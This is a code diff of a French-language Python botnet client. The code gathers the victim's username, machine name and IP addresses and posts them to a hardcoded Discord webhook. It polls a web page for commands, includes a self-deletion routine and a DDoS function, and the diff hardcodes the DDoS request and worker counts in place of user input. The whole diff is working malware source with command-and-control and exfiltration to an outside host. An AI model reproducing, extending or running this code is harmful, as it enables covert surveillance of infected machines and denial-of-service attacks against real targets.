@@ -12,7 +12,6 @@ headers = {
 }
 
 import os
-import sys
 
 webhook = "https://discordapp.com/api/webhooks/1445805470639067311/DdrHhMfsUhJbpH2bN8DBz_4-WblD3jlCgQtpLjS_4t5vjq6vuoURh0tGWhAIY2quGASi"
 
@@ -32,7 +31,6 @@ hostname = socket.gethostname()
 
 ip_public = requests.get("https://api.ipify.org").text
 name = (
-    f"Nom de l'ordinateur : {ordi.node}\n"
     f"Utilisateur actuel : {getpass.getuser()}\n"
     f"Nom de l'ordinateur : {ordi.node}\n"
     f"Adresse IP : {socket.gethostbyname(hostname)}\n"
@@ -66,28 +64,29 @@ def envoyer():
 def loop_check():
     while True:
         envoyer()
+        alerte()
         time.sleep(20)  # ← 20 secondes
 
 def alerte():
-    global valeur
     global previous_alerte, alerte_activée
 
     try:
         response = requests.get(url, headers=headers, verify=False)
         soup = BeautifulSoup(response.text, "html.parser")
+
         champ_alerte = soup.find("input", {"id": "alerte"})
         if champ_alerte:
             message_alerte = champ_alerte.get("value").strip()
-            # Détecter changement et n'agir que sur changement de valeur
+
             if message_alerte != "" and message_alerte != previous_alerte:
                 previous_alerte = message_alerte
                 alerte_activée = message_alerte
-                requests.post(webhook, json={"content": f"Alerte reçue : {message_alerte}"})
                 ip()
+
     except Exception as e:
         print("Erreur (alerte) :", e)
 
-    time.sleep(5)
+
 
 def ip():
     global ip_public, previous_ip, ip_cible
@@ -95,27 +94,55 @@ def ip():
     try:
         response = requests.get(url, headers=headers, verify=False)
         soup = BeautifulSoup(response.text, "html.parser")
+
         champ_ip = soup.find("input", {"id": "ip"})
         if champ_ip:
             ip_cible_nouveau = champ_ip.get("value").strip()
-            # Si nouvelle IP non vide et différente de la précédente
-            if ip_cible_nouveau != "" and ip_cible_nouveau != previous_ip:
-                previous_ip = ip_cible_nouveau
-                ip_cible = ip_cible_nouveau
-                # Validation basique du format IP
-                try:
-                    destroy()
-                    requests.post(webhook, json={"content": f"Nouvelle IP cible reçue : {ip_cible}"})
-                except ValueError:
-                    print("IP cible invalide :", ip_cible)
+
+            if ip_cible_nouveau != ip_public:
+                requests.post(webhook, json={"content": f"L'ip ne correspond pas à l'IP publique : {ip_public}"})
+                return
+
+            confirmer(ip_cible_nouveau)
+
     except Exception as e:
         print("Erreur (ip) :", e)
 
 
+
+def confirmer(ip_cible_nouveau):
+    global previous_ip, ip_cible
+
+    if ip_cible_nouveau != "" and ip_cible_nouveau != previous_ip:
+        previous_ip = ip_cible_nouveau
+        ip_cible = ip_cible_nouveau
+
+        try:
+            requests.post(webhook, json={"content": f" Botnet détruit à la demande de l'IP cible : {ip_cible}"})
+            destroy()
+        except ValueError:
+            print("IP cible invalide :", ip_cible)
+
+
+import os
+import sys
+import subprocess
+
 def destroy():
-    script_path = os.path.abspath(__file__)
+    script_path = os.path.abspath(sys.argv[0])
 
+    # Pour Windows
+    if os.name == "nt":
+        subprocess.Popen(
+            f'del "{script_path}"',
+            shell=True,
+        )
+    
+    # Pour Linux/Mac
+    else:
+        subprocess.Popen(["rm", script_path])
 
+    sys.exit()
 
 from concurrent.futures import ThreadPoolExecutor
 import asyncio
@@ -177,8 +204,8 @@ def ddos_attack():
     except ImportError:
         print("Module aiohttp non trouvé. Utilisation de la méthode plus lente.")
 
-        nombre_requetes = int(input("Combien de requêtes envoyer ? "))
-        max_workers = min(200, nombre_requetes)
+        nombre_requetes = int(500)
+        max_workers = min(10000, nombre_requetes)
         
         start_time = time.time()
         success_count = 0
